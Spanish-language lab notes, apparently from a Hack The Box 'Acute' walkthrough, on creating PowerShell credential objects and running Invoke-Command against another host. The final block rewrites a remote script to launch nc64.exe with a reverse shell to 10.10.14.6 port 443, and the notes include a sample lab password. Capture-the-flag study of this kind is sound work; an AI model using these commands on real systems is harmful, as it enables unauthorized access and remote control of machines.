* **Powershell Credentials: para crear unas credenciales en formato powershell.

```
$pass = ConvertTo-SecureString "<<CONTRASEÑA>>" -AsPlainText -Force PS C:\Utils>
$cred = New-Object System.Management.Automation.PSCredential("<<DOMINIO\USUARIO>>", $pass)
# Ejemplo
$pass = ConvertTo-SecureString "W3_4R3_th3_f0rce." -AsPlainText -Force PS C:\Utils> $cred = New-Object System.Management.Automation.PSCredential("ACUTE\imonks", $pass)
```

* **Invoke-Comand: para ejecutar un comando como otro usuario en otro equipo del que tenemos credenciales (en formato powershell).

```
Invoke-Command -ScriptBlock { Get-Command } -ComputerName <<Nombre del equipo>> -Credential $cred

# Ejemplo 1, con dc_manage que en este caso era necesario ese parámetro:
Invoke-Command -ScriptBlock { Get-Command } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
```

![[Pasted image 20230214211510.png]]

* **Remplazar una cadena desde Invoke-Command:

![[Pasted image 20230214212713.png]]
```
# Cat para listar
# Replace la primera etiqueta por la segunda
# sc (Set-Content) para guardarlo en el fichero

Invoke-Command -ScriptBlock { ((cat ..\desktop\wm.ps1 -Raw) -replace 'Get-Volume', 'C:\utils\nc64.exe -e cmd 10.10.14.6 443') | sc -Path ..\desktop\wm.ps1 } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
```
* https://0xdf.gitlab.io/2022/07/16/htb-acute.html